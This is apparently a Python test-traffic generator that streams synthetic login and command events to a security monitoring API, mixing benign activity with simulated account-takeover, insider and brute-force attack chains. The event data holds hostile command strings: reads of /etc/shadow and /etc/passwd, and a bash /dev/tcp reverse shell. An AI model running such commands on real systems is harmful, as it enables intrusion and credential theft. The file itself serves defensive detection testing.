
import argparse
import os
import random
import sys
import time
from datetime import datetime, timezone
from zoneinfo import ZoneInfo

import requests
from dotenv import load_dotenv

load_dotenv()
BASE_URL = os.getenv("SENTINEL_URL", "http://localhost:8000")
USERNAME = os.getenv("SENTINEL_USER")
PASSWORD = os.getenv("SENTINEL_PASSWORD")
if not USERNAME or not PASSWORD:
    sys.exit("Set SENTINEL_USER and SENTINEL_PASSWORD in .env")

PERSONAS = [
    {"username": "alice", "tz": "Africa/Johannesburg", "ip": "10.0.0.11"},
    {"username": "bob",   "tz": "Europe/London",       "ip": "10.0.0.45"},
    {"username": "carol", "tz": "America/New_York",    "ip": "10.0.0.78"},
]
BENIGN = ["ls -la", "git pull", "pytest -q", "docker ps", "vim notes.md", "df -h"]
ATTACKER_IPS = ["203.0.113.99", "198.51.100.23", "192.0.2.77"]


def business_ts(tz):
    """A timestamp during 09:00-16:59 local time for the given zone, in UTC."""
    local = datetime.now(ZoneInfo(tz)).replace(
        hour=random.randint(9, 16), minute=random.randint(0, 59), second=0, microsecond=0)
    return local.astimezone(timezone.utc).isoformat()


def night_ts():
    return datetime.now(timezone.utc).replace(
        hour=random.randint(1, 4), minute=random.randint(0, 59), second=0, microsecond=0).isoformat()


def event(user, ip, ts, fails, cmd):
    return {"username": user, "ip_address": ip, "timestamp": ts,
            "failed_logins": fails, "command": cmd}


def normal():
    p = random.choice(PERSONAS)
    fails = random.choices([0, 1, 2], weights=[85, 10, 5])[0]
    return event(p["username"], p["ip"], business_ts(p["tz"]), fails, random.choice(BENIGN))


def chain_takeover():
    user, ip, ts = random.choice(PERSONAS)["username"], random.choice(ATTACKER_IPS), night_ts()
    return "Account takeover", [
        ("brute force, unknown IP", event(user, ip, ts, random.randint(9, 14), "")),
        ("off-hours access, same IP", event(user, ip, ts, 7, "cat /etc/shadow")),
    ]


def chain_insider():
    p = random.choice(PERSONAS)
    return "Insider threat", [
        ("normal login", event(p["username"], p["ip"], business_ts(p["tz"]), 0, "ls -la")),
        ("sensitive file read", event(p["username"], p["ip"], business_ts(p["tz"]), 0, "cat /etc/passwd")),
    ]


def chain_shell():
    user, ip, ts = random.choice(PERSONAS)["username"], random.choice(ATTACKER_IPS), night_ts()
    return "Brute force + reverse shell", [
        ("sustained brute force", event(user, ip, ts, 12, "")),
        ("reverse shell", event(user, ip, ts, 7, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")),
    ]


CHAINS = [chain_takeover, chain_insider, chain_shell]


class Api:
    token = None

    def login(self):
        while True:
            r = requests.post(f"{BASE_URL}/auth/login",
                              json={"username": USERNAME, "password": PASSWORD}, timeout=10)
            if r.status_code == 200:
                self.token = r.json()["access_token"]
                return
            if r.status_code == 429:       # login is rate limited
                time.sleep(15)
                continue
            sys.exit(f"Login failed: {r.status_code} {r.text[:120]}")

    def send(self, payload, retry=True):
        r = requests.post(f"{BASE_URL}/events/activity", json=payload,
                          headers={"Authorization": f"Bearer {self.token}"}, timeout=10)
        if r.status_code == 401 and retry:  # token expired
            self.login()
            return self.send(payload, retry=False)
        if r.status_code == 429:
            time.sleep(10)
            return None
        if r.status_code != 200:
            print(f"  API error {r.status_code}: {r.text[:120]}")
            return None
        return r.json()


def show(label, res):
    if res:
        print(f"  {label:28} score={res.get('risk_score', '?'):>3}  level={res.get('alert_level', '?')}  id={res.get('id', '?')}")
    else:
        print(f"  {label:28} (no response)")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--interval", type=float, default=3.0, help="seconds between events")
    ap.add_argument("--attack-rate", type=float, default=0.12, help="chance per event that an attack chain starts")
    args = ap.parse_args()

    api = Api()
    api.login()
    print(f"Streaming events to {BASE_URL} (Ctrl+C to stop)")
    try:
        while True:
            if random.random() < args.attack_rate:
                name, steps = random.choice(CHAINS)()
                print(f"\n== {name} ==")
                for label, payload in steps:
                    show(label, api.send(payload))
                    time.sleep(args.interval)
                print()
            else:
                show("normal", api.send(normal()))
                time.sleep(args.interval * random.uniform(0.5, 1.5))
    except KeyboardInterrupt:
        print("\nstopped")


if __name__ == "__main__":
    main()